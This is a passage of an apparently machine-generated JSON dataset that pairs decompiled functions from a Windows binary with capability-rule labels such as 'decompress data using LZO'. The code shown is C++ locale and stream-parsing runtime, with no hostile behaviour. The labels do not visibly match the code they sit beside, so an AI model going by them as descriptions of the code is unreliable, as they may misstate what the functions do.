        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint * __cdecl fcn.004334d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint32_t in_stack_ffffffcc;\n    uint32_t uVar4;\n    uint uVar5;\n    uint noname_3;\n    uint noname_4;\n    uint in_stack_ffffffe4;\n    uint in_stack_ffffffe8;\n    uint in_stack_ffffffec;\n    uint var_bp_ch;\n    \n    noname_4 = 0xfffffffe;\n    noname_3 = 0x506e68;\n    uVar5 = 0x506e70;\n    puVar2 = fcn.004a3c60();\n    if (puVar2 == NULL) {\n        if (arg_8h == 0x4f6f08) {\n            puVar3 = fcn.004a3500(0x68, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x50adf0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            *(puVar3 + 9) = 0;\n            *(puVar3 + 0x19) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a5c0;\n            puVar2[2] = puVar3;\n            uVar4 = 0x43368f;\n            fcn.00498e40(0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509ef4;\n            puVar2[4] = puVar3;\n            fcn.00474c30(uVar4 & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x4f6ef8) {\n            puVar2 = fcn.004a3500(0x10, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a550;\n            uVar5 = fcn.0048f260();\n            puVar2[2] = uVar5;\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509e0c;\n        }\n        else if (arg_8h == 0x4f6f10) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a608;\n            puVar2[2] = in_ECX;\n            if (*0x4f59f4 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509f88;\n        }\n        else if (arg_8h == 0x4f6f18) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a660;\n            puVar2[2] = in_ECX;\n            if (*0x4f59f4 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a020;\n        }\n        else if (arg_8h == 0x4f6f20) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            iVar1 = *0x4f59f4;\n            puVar2[1] = 0;\n            *puVar2 = 0x50a690;\n            puVar2[2] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a080;\n        }\n        else if (arg_8h == 0x4f6eec) {\n            puVar3 = fcn.004a3500(0x44, uVar5);\n            *(puVar3 + 4) = 0;\n            *puVar3 = 0x50af24;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            *(puVar3 + 0x43) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a2d4;\n            puVar2[2] = puVar3;\n            fcn.0048fae0(0, 0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a164;\n            puVar2[4] = puVar3;\n            fcn.004758f0(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x4f6ee8) {\n            puVar3 = fcn.004a3500(0x44, uVar5);\n            *puVar3 = 0x50af14;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            *(puVar3 + 0x43) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a2a0;\n            puVar2[2] = puVar3;\n            fcn.0048f700(0, 0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a0fc;\n            puVar2[4] = puVar3;\n            fcn.00475410(in_stack_ffffffcc & 0xffffff00);\n        }\n        else if (arg_8h == 0x4f6f00) {\n            puVar2 = fcn.004a3500(0x14, uVar5);\n            fcn.00498be0(0);\n            iVar1 = *0x4f59f4;\n            puVar2[4] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509e7c;\n        }\n        else if (arg_8h == 0x4f6f0c) {\n            puVar3 = fcn.004a3500(0xa8, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x50ae00;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            *(puVar3 + 0x29) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a5e4;\n            puVar2[2] = puVar3;\n            uVar4 = 0x433ab3;\n            fcn.00499190(0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509f3c;\n            puVar2[4] = puVar3;\n            fcn.00474fd0(uVar4 & 0xffffff00, in_ECX, puVar3, noname_3, noname_4, in_stack_ffffffe4, in_stack_ffffffe8, \n                         in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr, 0x4f6f0c, \n                         in_stack_00000008, in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050);\n        }\n        else if (arg_8h == 0x4f6efc) {\n            puVar2 = fcn.004a3500(0x10, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a56c;\n            uVar5 = fcn.0048f260();\n            puVar2[2] = uVar5;\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509e44;\n        }\n        else if (arg_8h == 0x4f6f14) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a634;\n            puVar2[2] = in_ECX;\n            if (*0x4f59f4 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509fdc;\n        }\n        else if (arg_8h == 0x4f6f1c) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a678;\n            puVar2[2] = in_ECX;\n            if (*0x4f59f4 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a050;\n        }\n        else if (arg_8h == 0x4f6f24) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            iVar1 = *0x4f59f4;\n            puVar2[1] = 0;\n            *puVar2 = 0x50a6a8;\n            puVar2[2] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a0b0;\n        }\n        else if (arg_8h == 0x4f6ef4) {\n            puVar3 = fcn.004a3500(0x54, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x50af44;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            puVar3[0xe] = 0;\n            *(puVar3 + 0x52) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a33c;\n            puVar2[2] = puVar3;\n            fcn.004902b0(0, 0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a234;\n            puVar2[4] = puVar3;\n            fcn.004763b0(in_stack_ffffffcc & 0xffffff00);\n        }\n        else if (arg_8h == 0x4f6ef0) {\n            puVar3 = fcn.004a3500(0x54, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x50af34;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            puVar3[0xe] = 0;\n            *(puVar3 + 0x52) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a308;\n            puVar2[2] = puVar3;\n            uVar5 = 0;\n            fcn.0048fec0(0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a1cc;\n            puVar2[4] = puVar3;\n            fcn.00475dd0(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3, uVar5, noname_3, noname_4, in_stack_ffffffe4, \n                         in_stack_ffffffe8, in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr\n                         , 0x4f6ef0, in_stack_00000008, in_stack_0000000c, in_stack_00000010, in_stack_00000014, \n                         in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, \n                         in_stack_0000002c, in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, \n                         in_stack_00000040, in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050, \n                         in_stack_00000054, in_stack_00000058);\n        }\n        else {\n            if (arg_8h != 0x4f6f04) {\n                uVar5 = fcn.0049eb30(\"cannot create shim for unknown locale::facet\");\n                fcn.0048f380();\n                fcn.004a34c0(arg_8h);\n                fcn.0041b360(uVar5);\n                fcn.0048f380();\n                fcn.004a34c0(arg_8h);\n                fcn.0041b360(uVar5);\n                fcn.0048f380();\n                do {\n                    fcn.004a34c0(arg_8h);\n                    fcn.0041b360(uVar5);\n                    fcn.004a34c0(arg_8h);\n                    fcn.0041b360(uVar5);\n                    fcn.00433e60();\n                    fcn.0048fe90();\n                } while( true );\n            }\n            puVar2 = fcn.004a3500(0x14, uVar5);\n            fcn.00498d70(0);\n            iVar1 = *0x4f59f4;\n            puVar2[4] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509eb4;\n        }\n    }\n    else {\n        puVar2 = *puVar2;\n    }\n    return puVar2;\n}\n",
        "token_count": 5290
    },
    "00433ea0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint32_t __cdecl fcn.00433ea0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *in_ECX;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    if (*in_ECX == *arg_8h) {\n        return 1;\n    }\n    piVar1 = *(*in_ECX + 0x10);\n    iVar4 = *piVar1;\n    if (iVar4 != 0) {\n        piVar2 = *(*arg_8h + 0x10);\n        iVar3 = *piVar2;\n        if ((iVar3 != 0) && (iVar4 = sub.msvcrt.dll_strcmp(iVar4, iVar3),  iVar4 == 0)) {\n            if ((piVar1[1] == 0) && (piVar2[1] == 0)) {\n                return 1;\n            }\n            fcn.00432540(arg_8h);\n            fcn.00432540(in_ECX);\n            uVar5 = 0;\n            if ((var_44h == var_2ch) && (uVar5 = 1,  var_44h != 0)) {\n                uVar5 = sub.msvcrt.dll_memcmp(var_48h, var_30h, var_44h);\n                uVar5 = uVar5 & 0xffffff00 | uVar5 == 0;\n            }\n            if (var_48h != &var_40h) {\n                uVar5 = uVar5 & 0xff;\n                fcn.004a34c0(var_48h);\n            }\n            if (var_30h == &var_28h) {\n                return uVar5;\n            }\n            fcn.004a34c0(var_30h);\n            return uVar5 & 0xff;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 509
    },
    "004385e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004385e0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    char cVar3;\n    bool bVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    uint *puVar13;\n    uint *puVar14;\n    int32_t *piVar15;\n    int32_t *piVar17;\n    uint *puVar18;\n    uint *puVar19;\n    uint *puVar20;\n    int32_t iVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint uStack68;\n    int32_t aiStack64 [5];\n    char cStack41;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    int32_t *piVar16;\n    \n    aiStack64[1] = arg_24h + 0x6c;\n    aiStack64[0] = 0x4385f7;\n    var_1ch = fcn.004a0a80();\n    aiStack64[0] = 0x43860e;\n    iVar5 = fcn.00418950();\n    iVar5 = -iVar5;\n    *(&stack0xffffffc4 + iVar5) = &fcn.004385e0::arg_10h;\n    *(&stack0xffffffc0 + iVar5) = 0x438625;\n    cVar2 = fcn.00430ce0();\n    if (cVar2 == '\\0') {\n        *(&stack0xffffffbc + iVar5) = 0x43864d;\n        cVar2 = fcn.00430d80();\n        if (arg_20h != 0) {\n            iVar21 = 0;\n            var_20h = &stack0xffffffd7 + iVar5 & 0xfffffff0;\n            uVar22 = 0;\n            iVar8 = arg_1ch;\n            piVar11 = &stack0xffffffc0 + iVar5;\n            do {\n                while (cVar3 = **(iVar8 + iVar21 * 4),  cVar3 == cVar2) {\ncode_r0x0043869c:\n                    var_20h[uVar22] = iVar21;\n                    uVar22 = uVar22 + 1;\n                    iVar21 = iVar21 + 1;\n                    piVar15 = piVar11;\n                    if (arg_20h == iVar21) goto code_r0x004386ad;\n                }\n                iVar5 = *var_1ch;\n                *piVar11 = cVar3;\n                pcVar1 = *(iVar5 + 8);\n                piVar10 = piVar11 + -1;\n                piVar11[-1] = 0x438680;\n                arg_1ch = iVar8;\n                cVar3 = (*pcVar1)();\n                piVar11 = piVar10 + -4;\n                piVar15 = piVar10 + -4;\n                iVar8 = arg_1ch;\n                if (cVar2 == cVar3) goto code_r0x0043869c;\n                iVar21 = iVar21 + 1;\n                piVar11 = piVar10 + -4;\n            } while (arg_20h != iVar21);\ncode_r0x004386ad:\n            piVar11 = var_20h;\n            var_1ch = uVar22;\n            var_20h = NULL;\n            while (1 < var_1ch) {\n                uVar23 = 1;\n                *piVar15 = *(arg_1ch + *piVar11 * 4);\n                piVar15[-1] = 0x4386d8;\n                uVar22 = sub.msvcrt.dll_strlen();\n                do {\n                    *piVar15 = *(arg_1ch + piVar11[uVar23] * 4);\n                    piVar15[-1] = 0x4386f1;\n                    uVar6 = sub.msvcrt.dll_strlen();\n                    if (uVar6 < uVar22) {\n                        uVar22 = uVar6;\n                    }\n                    uVar23 = uVar23 + 1;\n                } while (uVar23 < var_1ch);\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    pcVar1 = *(*arg_8h + 0x28);\n                    piVar16 = piVar15 + -1;\n                    piVar15 = piVar15 + -1;\n                    *piVar16 = 0x438915;\n                    (*pcVar1)();\n                }\n                var_20h = var_20h + 1;\n                arg_ch = 0xffffffff;\n                if (uVar22 <= var_20h) goto code_r0x0043862c;\n                cVar2 = '\\x01';\n                if ((arg_8h != NULL) && (cVar2 = '\\0',  arg_8h[3] <= arg_8h[2])) {\n                    pcVar1 = *(*arg_8h + 0x24);\n                    piVar17 = piVar15 + -1;\n                    piVar15 = piVar15 + -1;\n                    *piVar17 = 0x43891f;\n                    iVar5 = (*pcVar1)();\n                    if (iVar5 == -1) {\n                        arg_8h = NULL;\n                        cVar2 = '\\x01';\n                    }\n                }\n                bVar4 = arg_10h != NULL && arg_14h == -1;\n                var_24h._0_1_ = arg_14h == -1;\n                if ((bVar4) && (var_24h._0_1_ = '\\0',  arg_10h[3] <= arg_10h[2])) {\n                    var_24h = var_24h & 0xffffff00;\n                    pcVar1 = *(*arg_10h + 0x24);\n                    puVar13 = piVar15 + -4;\n                    piVar15 = piVar15 + -4;\n                    *puVar13 = 0x4388ca;\n                    iVar5 = (*pcVar1)();\n                    if (iVar5 == -1) {\n                        arg_10h = NULL;\n                        var_24h._0_1_ = bVar4;\n                    }\n                }\n                if (cVar2 == var_24h) goto code_r0x0043862c;\n                uVar23 = 0;\n                uVar22 = var_1ch;\n                do {\n                    while( true ) {\n                        piVar9 = piVar11 + uVar23;\n                        var_1ch = var_1ch & 0xffffff00 | *(*(arg_1ch + *piVar9 * 4) + var_20h);\n                        uVar6 = arg_ch;\n                        if (arg_8h != NULL) {\n                            if (arg_8h[2] < arg_8h[3]) {\n                                uVar6 = *arg_8h[2];\n                            }\n                            else {\n                                var_24h = piVar9;\n                                pcVar1 = *(*arg_8h + 0x24);\n                                puVar14 = piVar15 + -4;\n                                piVar15 = piVar15 + -4;\n                                *puVar14 = 0x4388ed;\n                                uVar6 = (*pcVar1)();\n                                piVar9 = var_24h;\n                                if (uVar6 == 0xffffffff) {\n                                    arg_8h = NULL;\n                                    uVar6 = 0xffffffff;\n                                }\n                            }\n                        }\n                        if (var_1ch != uVar6) break;\n                        uVar23 = uVar23 + 1;\n                        if (uVar22 <= uVar23) goto code_r0x004387b3;\n                    }\n                    uVar22 = uVar22 - 1;\n                    *piVar9 = piVar11[uVar22];\n                } while (uVar23 < uVar22);\ncode_r0x004387b3:\n                var_1ch = uVar22;\n            }\n            if (var_1ch == 0x1) {\n                piVar15[-1] = 0x4387d1;\n                fcn.00485e80();\n                arg_ch = 0xffffffff;\n                var_24h = *piVar11;\n                var_1ch = *(arg_1ch + *piVar11 * 4);\n                uVar22 = var_20h + 1;\n                *piVar15 = var_1ch;\n                piVar15[-1] = 0x4387f4;\n                var_20h = sub.msvcrt.dll_strlen();\n                if (uVar22 < var_20h) {\n                    do {\n                        arg_ch = 0xffffffff;\n                        cVar2 = '\\x01';\n                        if ((arg_8h != NULL) && (cVar2 = '\\0',  arg_8h[3] <= arg_8h[2])) {\n                            pcVar1 = *(*arg_8h + 0x24);\n                            piVar12 = piVar15 + -1;\n                            piVar15 = piVar15 + -1;\n                            *piVar12 = 0x43888a;\n                            iVar5 = (*pcVar1)();\n                            if (iVar5 == -1) {\n                                arg_8h = NULL;\n                                cVar2 = '\\x01';\n                            }\n                        }\n                        bVar4 = arg_10h != NULL && arg_14h == -1;\n                        cVar3 = arg_14h == -1;\n                        if ((bVar4) && (cVar3 = '\\0',  arg_10h[3] <= arg_10h[2])) {\n                            cStack41 = bVar4;\n                            pcVar1 = *(*arg_10h + 0x24);\n                            puVar18 = piVar15 + -4;\n                            piVar15 = piVar15 + -4;\n                            *puVar18 = 0x438956;\n                            iVar5 = (*pcVar1)();\n                            if (iVar5 == -1) {\n                                arg_10h = NULL;\n                                cVar3 = cStack41;\n                            }\n                        }\n                        if (cVar2 == cVar3) goto code_r0x0043862c;\n                        cVar2 = *(var_1ch + uVar22);\n                        iVar5 = -1;\n                        if (arg_8h == NULL) {\ncode_r0x0043883b:\n                            if (cVar2 != iVar5) goto code_r0x0043862c;\n                            pcVar7 = arg_8h[2];\n                            if (pcVar7 < arg_8h[3]) goto code_r0x00438852;\n                            pcVar1 = *(*arg_8h + 0x28);\n                            puVar19 = piVar15 + -4;\n                            piVar15 = piVar15 + -4;\n                            *puVar19 = 0x438995;\n                            (*pcVar1)();\n                        }\n                        else {\n                            pcVar7 = arg_8h[2];\n                            if (arg_8h[3] <= pcVar7) {\n                                pcVar1 = *(*arg_8h + 0x24);\n                                puVar20 = piVar15 + -4;\n                                piVar15 = piVar15 + -4;\n                                *puVar20 = 0x4389b2;\n                                iVar5 = (*pcVar1)();\n                                if (iVar5 == -1) {\n                                    arg_8h = NULL;\n                                }\n                                goto code_r0x0043883b;\n                            }\n                            if (cVar2 != *pcVar7) goto code_r0x0043862c;\ncode_r0x00438852:\n                            arg_8h[2] = pcVar7 + 1;\n                        }\n                        uVar22 = uVar22 + 1;\n                    } while (uVar22 != var_20h);\n                }\n                else if (uVar22 != var_20h) goto code_r0x0043862c;\n                arg_ch = 0xffffffff;\n                *arg_18h = var_24h;\n                goto code_r0x00438632;\n            }\n        }\n    }\ncode_r0x0043862c:\n    *arg_28h = *arg_28h | 4;\ncode_r0x00438632:\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 2895
    },
    "00439d30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00439d30(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, uint32_t *arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint *puVar11;\n    uint8_t uVar12;\n    uint8_t uVar13;\n    uint *puVar14;\n    int32_t *piVar15;\n    uchar *puVar16;\n    uint *puVar17;\n    uint *puVar18;\n    uint *puVar19;\n    uint *puVar20;\n    uint *puVar21;\n    uchar *puVar22;\n    uint *puVar23;\n    uint *puVar24;\n    bool bVar25;\n    uint uStack96;\n    int32_t iStack92;\n    uchar auStack73 [5];\n    uint *var_40h;\n    int32_t *var_3ch;\n    uint32_t var_38h;\n    int32_t *var_34h;\n    uint *var_2eh;\n    uint32_t *var_28h;\n    uint32_t *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint var_ch;\n    \n    var_34h = arg_8h;\n    iStack92 = arg_24h + 0x6c;\n    var_38h = arg_ch;\n    var_3ch = arg_10h;\n    uStack96 = 0x439d5c;\n    var_24h = fcn.004a0a80();\n    uStack96 = 0x439d74;\n    iVar4 = fcn.00418950();\n    iVar4 = -iVar4;\n    var_20h._0_1_ = arg_ch == 0xffffffff;\n    var_28h = &stack0xffffffb7 + iVar4 & 0xfffffff0;\n    bVar2 = var_34h != NULL && var_20h;\n    var_1ch = var_1ch & 0xffffff00 | bVar2;\n    puVar16 = &stack0xffffffa4 + iVar4;\n    if ((bVar2) && (var_20h._0_1_ = 0,  puVar16 = &stack0xffffffa4 + iVar4,  var_34h[3] <= var_34h[2])) {\n        var_20h = var_20h & 0xffffff00;\n        pcVar1 = *(*var_34h + 0x24);\n        puVar16 = &stack0xffffffa0 + iVar4;\n        *(&stack0xffffffa0 + iVar4) = 0x43a09e;\n        iVar4 = (*pcVar1)();\n        if (iVar4 == -1) {\n            var_34h = NULL;\n            var_1ch = var_1ch & 0xffffff00;\n            var_20h._0_1_ = var_1ch;\n        }\n    }\n    bVar25 = arg_14h == -1;\n    var_2eh._0_1_ = bVar25;\n    bVar2 = arg_10h != NULL && bVar25;\n    if (bVar2) {\n        if (arg_10h[2] < arg_10h[3]) {\n            bVar25 = false;\n        }\n        else {\n            var_20h = var_20h & 0xffffff00 | var_20h;\n            pcVar1 = *(*arg_10h + 0x24);\n            puVar20 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar20 = 0x43a178;\n            iVar4 = (*pcVar1)();\n            var_3ch = NULL;\n            if (iVar4 != -1) {\n                var_3ch = arg_10h;\n            }\n            bVar25 = iVar4 == -1 && bVar2;\n        }\n    }\n    piVar8 = var_34h;\n    if (var_20h == bVar25) {\n        var_40h = NULL;\n        puVar24 = NULL;\n        puVar23 = NULL;\n    }\n    else {\n        if (var_1ch == '\\0') {\n            var_1ch = var_1ch & 0xffffff00 | arg_ch & 0xff;\n        }\n        else if (var_34h[2] < var_34h[3]) {\n            var_1ch = var_1ch & 0xffffff00 | *var_34h[2];\n        }\n        else {\n            pcVar1 = *(*var_34h + 0x24);\n            puVar21 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar21 = 0x43a1a6;\n            uVar9 = (*pcVar1)();\n            uVar5 = 0xffffffff;\n            if (uVar9 != 0xffffffff) {\n                uVar5 = uVar9;\n            }\n            var_34h = NULL;\n            if (uVar9 != 0xffffffff) {\n                var_34h = piVar8;\n            }\n            var_1ch = var_1ch & 0xffffff00 | uVar5 & 0xff;\n        }\n        puVar24 = arg_20h * 2;\n        if (puVar24 == NULL) {\n            puVar23 = NULL;\n            var_40h = NULL;\n        }\n        else {\n            var_20h = puVar24;\n            puVar24 = NULL;\n            puVar23 = NULL;\n            piVar8 = puVar16;\n            do {\n                while( true ) {\n                    cVar3 = **(arg_1ch + puVar24 * 4);\n                    if (cVar3 != var_1ch) break;\ncode_r0x00439fd8:\n                    var_28h[puVar23] = puVar24;\n                    puVar23 = 